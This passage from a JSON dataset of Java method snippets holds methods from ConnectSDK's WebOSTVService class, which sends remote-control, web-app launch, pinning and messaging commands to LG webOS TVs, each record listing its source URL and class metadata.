ok(final ResponseListener<Object> listener) {\n        if (mouseSocket != null) {\n            mouseSocket.click();\n            Util.postSuccess(listener, null);\n        }\n        else {\n            connectMouse(new WebOSTVMouseSocketConnection.WebOSTVMouseSocketListener() {\n                @Override\n                public void onConnected() {\n                    mouseSocket.click();\n                    Util.postSuccess(listener, null);\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34756, "method_name": "back", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void back(ResponseListener<Object> listener) {\n        sendSpecialKey(\"BACK\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34757, "method_name": "home", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void home(ResponseListener<Object> listener) {\n        sendSpecialKey(\"HOME\", listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34758, "method_name": "getWebAppLauncher", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "WebAppLauncher", "snippet": "    public WebAppLauncher getWebAppLauncher() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34759, "method_name": "getWebAppLauncherCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getWebAppLauncherCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34760, "method_name": "launchWebApp", "class_name": "WebOSTVService", "params": ["String", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchWebApp(final String webAppId, final WebAppSession.LaunchListener listener) {\n        this.launchWebApp(webAppId, null, true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34761, "method_name": "launchWebApp", "class_name": "WebOSTVService", "params": ["String", "boolean", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchWebApp(String webAppId, boolean relaunchIfRunning, WebAppSession.LaunchListener listener) {\n        launchWebApp(webAppId, null, relaunchIfRunning, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34762, "method_name": "launchWebApp", "class_name": "WebOSTVService", "params": ["String", "JSONObject", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchWebApp(final String webAppId, final JSONObject params, final WebAppSession.LaunchListener listener) {\n        if (webAppId == null || webAppId.length() == 0) {\n            Util.postError(listener, new ServiceCommandError(-1, \"You need to provide a valid webAppId.\", null));\n\n            return;\n        }\n\n        final WebOSWebAppSession _webAppSession = mWebAppSessions.get(webAppId);\n\n        String uri = \"ssap://webapp/launchWebApp\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"webAppId\", webAppId);\n\n            if (params != null)\n                payload.put(\"urlParams\", params);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(final Object response) {\n                JSONObject obj = (JSONObject) response;\n\n                LaunchSession launchSession = null;\n                WebOSWebAppSession webAppSession = _webAppSession;\n\n                if (webAppSession != null)\n                    launchSession = webAppSession.launchSession;\n                else {\n                    launchSession = LaunchSession.launchSessionForAppId(webAppId);\n                    webAppSession = new WebOSWebAppSession(launchSession, WebOSTVService.this);\n                    mWebAppSessions.put(webAppId, webAppSession);\n                }\n\n                launchSession.setService(WebOSTVService.this);\n                launchSession.setSessionId(obj.optString(\"sessionId\"));\n                launchSession.setSessionType(LaunchSessionType.WebApp);\n                launchSession.setRawData(obj);\n\n                Util.postSuccess(listener, webAppSession);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34763, "method_name": "launchWebApp", "class_name": "WebOSTVService", "params": ["String", "JSONObject", "boolean", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void launchWebApp(final String webAppId, final JSONObject params, boolean relaunchIfRunning, final WebAppSession.LaunchListener listener) {\n        if (webAppId == null) {\n            Util.postError(listener, new ServiceCommandError(0, \"Must pass a web App id\", null));\n            return;\n        }\n\n        if (relaunchIfRunning) {\n            launchWebApp(webAppId, params, listener);\n        } else {\n            getLauncher().getRunningApp(new AppInfoListener() {\n\n                @Override\n                public void onError(ServiceCommandError error) {\n                    Util.postError(listener, error);\n                }\n\n                @Override\n                public void onSuccess(AppInfo appInfo) {\n                    //  TODO: this will only work on pinned apps, currently\n                    if (appInfo.getId().indexOf(webAppId) != -1) {\n                        LaunchSession launchSession = LaunchSession.launchSessionForAppId(webAppId);\n                        launchSession.setSessionType(LaunchSessionType.WebApp);\n                        launchSession.setService(WebOSTVService.this);\n                        launchSession.setRawData(appInfo.getRawData());\n\n                        WebOSWebAppSession webAppSession = webAppSessionForLaunchSession(launchSession);\n\n                        Util.postSuccess(listener, webAppSession);\n                    } else {\n                        launchWebApp(webAppId, params, listener);\n                    }\n                }\n            });\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34764, "method_name": "closeWebApp", "class_name": "WebOSTVService", "params": ["LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void closeWebApp(LaunchSession launchSession, final ResponseListener<Object> listener) {\n        if (launchSession == null || launchSession.getAppId() == null || launchSession.getAppId().length() == 0) {\n            Util.postError(listener, new ServiceCommandError(0, \"Must provide a valid launch session\", null));\n            return;\n        }\n\n        final WebOSWebAppSession webAppSession = mWebAppSessions.get(launchSession.getAppId());\n        if (webAppSession != null) {\n            webAppSession.disconnectFromWebApp();\n        }\n\n        String uri = \"ssap://webapp/closeWebApp\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            if (launchSession.getAppId() != null) payload.put(\"webAppId\", launchSession.getAppId());\n            if (launchSession.getSessionId() != null) payload.put(\"sessionId\", launchSession.getSessionId());\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34765, "method_name": "connectToWebApp", "class_name": "WebOSTVService", "params": ["WebOSWebAppSession", "boolean", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectToWebApp(final WebOSWebAppSession webAppSession, final boolean joinOnly, final ResponseListener<Object> connectionListener) {\n        if (mWebAppSessions == null)\n            mWebAppSessions = new ConcurrentHashMap<String, WebOSWebAppSession>();\n\n        if (mAppToAppIdMappings == null)\n            mAppToAppIdMappings = new ConcurrentHashMap<String, String>();\n\n        if (webAppSession == null || webAppSession.launchSession == null) {\n            Util.postError(connectionListener, new ServiceCommandError(0, \"You must provide a valid LaunchSession object\", null));\n            return;\n        }\n\n        String _appId = webAppSession.launchSession.getAppId();\n        String _idKey = null;\n\n        if (webAppSession.launchSession.getSessionType() == LaunchSession.LaunchSessionType.WebApp)\n            _idKey = \"webAppId\";\n        else\n            _idKey = \"appId\";\n\n        if (_appId == null || _appId.length() == 0) {\n            Util.postError(connectionListener, new ServiceCommandError(-1, \"You must provide a valid web app session\", null));\n\n            return;\n        }\n\n        final String appId = _appId;\n        final String idKey = _idKey;\n\n        String uri = \"ssap://webapp/connectToApp\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(idKey, appId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(final Object response) {\n                JSONObject jsonObj = (JSONObject)response;\n\n                String state = jsonObj.optString(\"state\");\n\n                if (!state.equalsIgnoreCase(\"CONNECTED\")) {\n                    if (joinOnly && state.equalsIgnoreCase(\"WAITING_FOR_APP\")) {\n                        Util.postError(connectionListener, new ServiceCommandError(0, \"Web app is not currently running\", null));\n                    }\n\n                    return;\n                }\n\n                String fullAppId = jsonObj.optString(\"appId\");\n\n                if (fullAppId != null && fullAppId.length() != 0) {\n                    if (webAppSession.launchSession.getSessionType() == LaunchSessionType.WebApp)\n                        mAppToAppIdMappings.put(fullAppId, appId);\n\n                    webAppSession.setFullAppId(fullAppId);\n                }\n\n                if (connectionListener != null) {\n                    Util.runOnUI(new Runnable() {\n\n                        @Override\n                        public void run() {\n                            connectionListener.onSuccess(response);\n                        }\n                    });\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                webAppSession.disconnectFromWebApp();\n\n                boolean appChannelDidClose = false;\n\n                if (error != null && error.getPayload() != null)\n                    appChannelDidClose = error.getPayload().toString().contains(\"app channel closed\");\n\n                if (appChannelDidClose) {\n                    if (webAppSession.getWebAppSessionListener() != null) {\n                        Util.runOnUI(new Runnable() {\n\n                            @Override\n                            public void run() {\n                                webAppSession.getWebAppSessionListener().onWebAppSessionDisconnect(webAppSession);\n                            }\n                        });\n                    }\n                } else {\n                    Util.postError(connectionListener, error);\n                }\n            }\n        };\n\n        webAppSession.appToAppSubscription = new URLServiceSubscription<ResponseListener<Object>>(webAppSession.socket, uri, payload, true, responseListener);\n        webAppSession.appToAppSubscription.subscribe();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34766, "method_name": "notifyPairingRequired", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void notifyPairingRequired() {\n        if (listener != null) {\n            listener.onPairingRequired(this, pairingType, null);\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34767, "method_name": "pinWebApp", "class_name": "WebOSTVService", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pinWebApp(String webAppId, final ResponseListener<Object> listener) {\n        if (webAppId == null || webAppId.length() == 0) {\n            if (listener != null) {\n                listener.onError(new ServiceCommandError(-1, \"You must provide a valid web app id\", null));\n            }\n            return;\n        }\n        \n        String uri = \"ssap://webapp/pinWebApp\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"webAppId\", webAppId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(final Object response) {\n                JSONObject obj = (JSONObject) response;\n                if (obj.has(\"pairingType\")) {\n                    notifyPairingRequired();\n                }\n                else if (listener != null) {\n                    listener.onSuccess(response);\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request = \n                new URLServiceSubscription<ResponseListener<Object>>(this, uri, payload, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34768, "method_name": "unPinWebApp", "class_name": "WebOSTVService", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void unPinWebApp(String webAppId, final ResponseListener<Object> listener) {\n        if (webAppId == null || webAppId.length() == 0) {\n            if (listener != null) {\n                listener.onError(new ServiceCommandError(-1, \"You must provide a valid web app id\", null));\n            }\n            return;\n        }\n\n        String uri = \"ssap://webapp/removePinnedWebApp\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"webAppId\", webAppId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(final Object response) {\n                JSONObject obj = (JSONObject) response;\n                if (obj.has(\"pairingType\")) {\n                    notifyPairingRequired();\n                }\n                else if (listener != null) {\n                    listener.onSuccess(response);\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<ResponseListener<Object>> request =\n                new URLServiceSubscription<ResponseListener<Object>>(this, uri, payload, true, responseListener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34769, "method_name": "isWebAppPinned", "class_name": "WebOSTVService", "params": ["boolean", "String", "WebAppPinStatusListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<WebAppPinStatusListener>", "snippet": "    private ServiceCommand<WebAppPinStatusListener> isWebAppPinned(boolean isSubscription, String webAppId, final WebAppPinStatusListener listener) {\n        if (webAppId == null || webAppId.length() == 0) {\n            if (listener != null) {\n                listener.onError(new ServiceCommandError(-1, \"You must provide a valid web app id\", null));\n            }\n            return null;\n        }\n\n        String uri = \"ssap://webapp/isWebAppPinned\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"webAppId\", webAppId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(final Object response) {\n                JSONObject obj = (JSONObject) response;\n\n                boolean status = obj.optBoolean(\"pinned\");\n\n                if (listener != null) {\n                    listener.onSuccess(status);\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        ServiceCommand<WebAppPinStatusListener> request;\n        if (isSubscription)\n            request = new URLServiceSubscription<WebAppPinStatusListener>(this, uri, payload, true, responseListener);\n        else \n            request = new ServiceCommand<WebAppPinStatusListener>(this, uri, payload, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34770, "method_name": "isWebAppPinned", "class_name": "WebOSTVService", "params": ["String", "WebAppPinStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void isWebAppPinned(String webAppId, WebAppPinStatusListener listener) {\n        isWebAppPinned(false, webAppId, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34771, "method_name": "subscribeIsWebAppPinned", "class_name": "WebOSTVService", "params": ["String", "WebAppPinStatusListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<WebAppPinStatusListener>", "snippet": "    public ServiceSubscription<WebAppPinStatusListener> subscribeIsWebAppPinned(\n            String webAppId, WebAppPinStatusListener listener) {\n        return (URLServiceSubscription<WebAppPinStatusListener>)isWebAppPinned(true, webAppId, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34772, "method_name": "joinApp", "class_name": "WebOSTVService", "params": ["String", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void joinApp(String appId, WebAppSession.LaunchListener listener) {\n        LaunchSession launchSession = LaunchSession.launchSessionForAppId(appId);\n        launchSession.setSessionType(LaunchSessionType.App);\n        launchSession.setService(this);\n\n        joinWebApp(launchSession, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34773, "method_name": "connectToApp", "class_name": "WebOSTVService", "params": ["String", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void connectToApp(String appId, final WebAppSession.LaunchListener listener) {\n        LaunchSession launchSession = LaunchSession.launchSessionForAppId(appId);\n        launchSession.setSessionType(LaunchSessionType.App);\n        launchSession.setService(this);\n\n        final WebOSWebAppSession webAppSession = webAppSessionForLaunchSession(launchSession);\n\n        connectToWebApp(webAppSession, false, new ResponseListener<Object>() {\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n\n            @Override\n            public void onSuccess(Object object) {\n                Util.postSuccess(listener, webAppSession);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34774, "method_name": "joinWebApp", "class_name": "WebOSTVService", "params": ["LaunchSession", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void joinWebApp(final LaunchSession webAppLaunchSession, final WebAppSession.LaunchListener listener) {\n        final WebOSWebAppSession webAppSession = this.webAppSessionForLaunchSession(webAppLaunchSession);\n\n        webAppSession.join(new ResponseListener<Object>() {\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n\n            @Override\n            public void onSuccess(Object object) {\n                Util.postSuccess(listener, webAppSession);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34775, "method_name": "joinWebApp", "class_name": "WebOSTVService", "params": ["String", "WebAppSession"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void joinWebApp(String webAppId, WebAppSession.LaunchListener listener) {\n        LaunchSession launchSession = LaunchSession.launchSessionForAppId(webAppId);\n        launchSession.setSessionType(LaunchSessionType.WebApp);\n        launchSession.setService(this);\n\n        joinWebApp(launchSession, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34776, "method_name": "webAppSessionForLaunchSession", "class_name": "WebOSTVService", "params": ["LaunchSession"], "throws": null, "modifiers": ["private"], "return_type": "WebOSWebAppSession", "snippet": "    private WebOSWebAppSession webAppSessionForLaunchSession(LaunchSession launchSession) {\n        if (mWebAppSessions == null)\n            mWebAppSessions = new ConcurrentHashMap<String, WebOSWebAppSession>();\n\n        if (launchSession.getService() == null)\n            launchSession.setService(this);\n\n        WebOSWebAppSession webAppSession = mWebAppSessions.get(launchSession.getAppId());\n\n        if (webAppSession == null) {\n            webAppSession = new WebOSWebAppSession(launchSession, this);\n            mWebAppSessions.put(launchSession.getAppId(), webAppSession);\n        }\n\n        return webAppSession;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34777, "method_name": "sendMessage", "class_name": "WebOSTVService", "params": ["Object", "LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sendMessage(Object message, LaunchSession launchSession, ResponseListener<Object> listener) {\n        if (launchSession == null || launchSession.getAppId() == null) {\n            Util.postError(listener, new ServiceCommandError(0, \"Must provide a valid LaunchSession object\", null));\n            return;\n        }\n\n        if (message == null) {\n            Util.postError(listener, new ServiceCommandError(0, \"Cannot send a null message\", null));\n            return;\n        }\n\n        if (socket == null) {\n            connect();\n        }\n\n        String appId = launchSession.getAppId();\n        String fullAppId = appId;\n\n        if (launchSession.getSessionType() == LaunchSessionType.WebApp)\n            fullAppId = mAppToAppIdMappings.get(appId);\n\n        if (fullAppId == null || fullAppId.length() == 0) {\n            Util.postError(listener, new ServiceCommandError(-1, \"You must provide a valid LaunchSession to send messages to\", null));\n\n            return;\n        }\n\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"type\", \"p2p\");\n            payload.put(\"to\", fullAppId);\n            payload.put(\"payload\", message);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, null, payload, true, listener);\n        sendCommand(request);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34778, "method_name": "sendMessage", "class_name": "WebOSTVService", "params": ["String", "LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendMessage(String message, LaunchSession launchSession, ResponseListener<Object> listener) {\n        if (message != null && message.length() > 0) {\n            sendMessage((Object) message, launchSession, listener);\n        } \n        else {\n            Util.postError(listener, new ServiceCommandError(0, \"Cannot send a null message\", null));\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34779, "method_name": "sendMessage", "class_name": "WebOSTVService", "params": ["JSONObject", "LaunchSession", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void sendMessage(JSONObject message, LaunchSession launchSession, ResponseListener<Object> listener) {\n        if (message != null && message.length() > 0)\n            sendMessage((Object) message, launchSession, listener);\n        else\n            Util.postError(listener, new ServiceCommandError(0, \"Cannot send a null message\", null));\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34780, "method_name": "getServiceInfo", "class_name": "WebOSTVService", "params": ["ServiceInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getServiceInfo(final ServiceInfoListener listener) {\n        String uri = \"ssap://api/getServiceList\";\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n      